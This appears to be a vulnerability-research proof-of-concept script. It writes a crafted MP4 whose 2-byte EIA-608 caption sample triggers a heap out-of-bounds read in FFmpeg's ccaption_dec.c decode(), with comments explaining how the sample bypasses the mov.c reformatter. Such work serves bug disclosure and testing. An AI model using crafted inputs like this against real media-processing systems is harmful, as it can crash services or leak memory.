#!/usr/bin/env python3
"""
PoC generator for VULN-001: Heap OOB Read in ccaption_dec.c decode()
Constructs a minimal MP4 with a c608 (EIA-608) subtitle track where
the subtitle sample size is 2 bytes (not a multiple of 3).

Key insight: In libavformat/mov.c, the get_eia608_packet() reformatter
is only called when sample->size > 8. For sample->size <= 8, the raw
bytes are passed directly via av_get_packet(). When len=2 reaches
decode() in ccaption_dec.c, the loop at line 869:
    for (i = 0; i < len; i += 3)
runs once (i=0), and validate_cc_data_pair(bptr+0, &hi) reads
bptr[2] out-of-bounds (only 2 bytes allocated).
"""
import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(SCRIPT_DIR, 'vuln_001_input.mp4')

def u32be(v):
    return struct.pack('>I', v)

def box(name, payload=b''):
    if isinstance(name, str):
        name = name.encode('latin1')
    total = 8 + len(payload)
    return struct.pack('>I', total) + name + payload

def fullbox(name, version, flags, payload=b''):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 1 byte version + 3 bytes flags
    return box(name, hdr + payload)

# The 2-byte EIA-608 subtitle sample (size % 3 == 2, triggers OOB)
# The byte 0xFC has bit 2 set (cc_valid=1) and bits 0-1 = 0 (cc_type=0 = field1)
# This makes validate_cc_data_pair read bptr[2] which is out-of-bounds.
CC_DATA = bytes([0xFC, 0x20])  # 2 bytes, NOT multiple of 3

# ---- ftyp ----
ftyp = box('ftyp',
    b'isom' +           # major brand
    b'\x00\x00\x00\x00' +  # minor version
    b'isom' + b'iso2' + b'mp41'  # compatible brands
)

# ---- Build sample table boxes ----

# stsd: sample description table
# The c608 sample entry: 6 reserved bytes + data_reference_index(2) + 8 reserved bytes
c608_entry = box('c608',
    b'\x00' * 6 +       # reserved
    b'\x00\x01' +       # data-reference-index = 1
    b'\x00' * 8         # reserved (additional bytes for subtitle sample entry)
)
stsd = fullbox('stsd', 0, 0, u32be(1) + c608_entry)

# stts: time-to-sample (1 entry: count=1, duration=90000)
stts = fullbox('stts', 0, 0,
    u32be(1) +          # entry count
    u32be(1) +          # sample count
    u32be(90000)        # sample delta (1 second at 90000Hz timescale)
)

# stsc: sample-to-chunk (1 chunk containing 1 sample of sample_description_index=1)
stsc = fullbox('stsc', 0, 0,
    u32be(1) +          # entry count
    u32be(1) +          # first chunk
    u32be(1) +          # samples per chunk
    u32be(1)            # sample description index
)

# stsz: sample sizes (1 sample, size=2)
stsz = fullbox('stsz', 0, 0,
    u32be(0) +          # sample_size (0 = variable)
    u32be(1) +          # sample count
    u32be(len(CC_DATA)) # sample 1 size = 2
)

# stco: chunk offsets (placeholder, will be patched)
stco = fullbox('stco', 0, 0,
    u32be(1) +          # entry count
    u32be(0)            # chunk 1 offset (TBD)
)

stbl = box('stbl', stsd + stts + stsc + stsz + stco)

# ---- dinf / dref ----
# url box with flags=1 (self-contained)
url_box = fullbox('url ', 0, 1)  # flags=1 = self-contained, no URL string
dref = fullbox('dref', 0, 0,
    u32be(1) +          # entry count
    url_box
)
dinf = box('dinf', dref)

# ---- media info header ----
# Use 'nmhd' (null media header) which is generic and widely accepted
nmhd = fullbox('nmhd', 0, 0)

minf = box('minf', nmhd + dinf + stbl)

# ---- mdia ----
mdhd = fullbox('mdhd', 0, 0,
    u32be(0) +          # creation time
    u32be(0) +          # modification time
    u32be(90000) +      # timescale (90kHz)
    u32be(90000) +      # duration (1 second)
    b'\x55\xc4' +       # language ('und' encoded as packed ISO-639-2/T)
    b'\x00\x00'         # pre-defined
)
# Handler: 'sbtl' is the subtitle handler type used in MOV for subtitle tracks
hdlr = fullbox('hdlr', 0, 0,
    u32be(0) +          # pre-defined
    b'sbtl' +           # handler type: subtitle
    u32be(0) + u32be(0) + u32be(0) +  # reserved
    b'Subtitle Handler\x00'
)
mdia = box('mdia', mdhd + hdlr + minf)

# ---- tkhd ----
tkhd_flags = 3  # track enabled + in movie
tkhd = fullbox('tkhd', 0, tkhd_flags,
    u32be(0) +          # creation time
    u32be(0) +          # modification time
    u32be(1) +          # track ID = 1
    u32be(0) +          # reserved
    u32be(90000) +      # duration (in movie timescale)
    u32be(0) + u32be(0) +  # reserved
    b'\x00\x00' +       # layer
    b'\x00\x00' +       # alternate group
    b'\x00\x00' +       # volume (0 for non-audio)
    b'\x00\x00' +       # reserved
    # transformation matrix (identity)
    struct.pack('>9i',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000
    ) +
    u32be(0) +          # width (0 for subtitle)
    u32be(0)            # height (0 for subtitle)
)

trak = box('trak', tkhd + mdia)

# ---- mvhd ----
mvhd = fullbox('mvhd', 0, 0,
    u32be(0) +          # creation time
    u32be(0) +          # modification time
    u32be(90000) +      # timescale (movie timescale = track timescale for simplicity)
    u32be(90000) +      # duration (1 second)
    struct.pack('>i', 0x00010000) +  # rate = 1.0
    b'\x01\x00' +       # volume = 1.0
    b'\x00\x00' +       # reserved
    u32be(0) + u32be(0) +  # reserved
    # transformation matrix (identity)
    struct.pack('>9i',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000
    ) +
    u32be(0) * 6 +      # pre-defined
    u32be(2)            # next track ID = 2
)

moov = box('moov', mvhd + trak)

# ---- Patch stco offset ----
# chunk_offset = ftyp_size + moov_size + mdat_header(8 bytes)
mdat_header_size = 8
chunk_offset = len(ftyp) + len(moov) + mdat_header_size

moov_bytes = bytearray(moov)
stco_tag = b'stco'
idx = moov_bytes.find(stco_tag)
if idx < 0:
    raise RuntimeError("Could not find 'stco' box in moov!")

# find() returns position of 'stco' tag (4 bytes)
# after tag: version(1) + flags(3) + entry_count(4) + chunk_offset(4)
offset_pos = idx + 4 + 1 + 3 + 4  # after tag(4) + version(1) + flags(3) + entry_count(4)
struct.pack_into('>I', moov_bytes, offset_pos, chunk_offset)
moov = bytes(moov_bytes)

# ---- mdat ----
mdat = box('mdat', CC_DATA)

# ---- Assemble final file ----
data = ftyp + moov + mdat

with open(OUT, 'wb') as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"[+] CC_DATA size = {len(CC_DATA)} bytes (should be NOT multiple of 3 -> triggers OOB)")
print(f"[+] chunk_offset = {chunk_offset} (patched into stco)")
print(f"[+] sample->size = {len(CC_DATA)} <= 8, so mov.c skips get_eia608_packet()")
print(f"[+] Raw {len(CC_DATA)}-byte packet passed to ccaption_dec decode()")
print(f"[+] In decode(): loop runs with i=0, validate_cc_data_pair reads bptr[2] OOB!")
